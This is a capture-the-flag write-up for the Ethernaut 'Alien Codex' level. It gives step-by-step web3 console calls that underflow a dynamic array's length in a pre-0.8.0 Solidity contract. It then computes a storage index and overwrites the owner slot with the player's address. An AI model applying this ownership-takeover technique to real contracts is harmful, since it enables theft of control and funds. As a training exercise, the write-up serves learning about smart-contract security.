# Ethernaut challenge 19 Alien Codex

## Hack:

- `await contract.make_contact()`// Change contract bool to true
- `await web3.eth.getStorageAt(contract.address, 0, console.log);` // display current owner and bool (contact) value packed.

- `await contract.retract();` // Call retract function and decrement the codex length. This is possible because the compiler version is less than 0.8.0 and there is no underflow protection lib. With the length of codex now at 2 ** 256 -1 32 byte slots we are now able to overwrite any data we would like. 

- `await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x0000000000000000000000005f1bC8fD0059aa02a270d2e31375190cb4e156aF', {from:player, gas: 900000});` // Where the first argument is the location in memory, and the second, your wallet address.

## Calculating the first arg:

We can see below that the codex length will be in slot 1 (owner address and bool value will be packed into slot 0). So we will begin with `keccak256(bytes32(1))` to locate the begining of the dynamic array in memory and work backwards `index = 2 ** 256 - uint(beginingOfArray)`

```
Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes. 
```

See https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html To better under stand the above calculations for finding the `owner` value of the contract.




